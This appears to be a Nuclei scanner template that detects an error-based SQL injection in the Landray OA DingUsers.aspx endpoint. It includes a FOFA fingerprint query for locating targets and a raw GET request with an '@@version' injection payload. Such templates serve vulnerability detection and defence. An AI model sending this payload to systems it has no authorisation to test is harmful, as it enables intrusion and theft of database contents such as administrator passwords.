id: Landray-DingUsers_aspx-sql

info:
  name: 蓝凌OA DingUsers.aspx SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/Scripts/jquery.landray.dialog.js"
    蓝凌OA DingUsers.aspx 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/kvf1lyJ0g-jQcHI2LnYKxw
  tags: sql injection

http:
  - raw:
      - |
        GET /SM/DingUsers.aspx?id=1%20and%201=@@version-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '转换成数据类型 int 时失败'
          - '在将 nvarchar 值'
        condition: and
      - type: status
        status: 
          - 500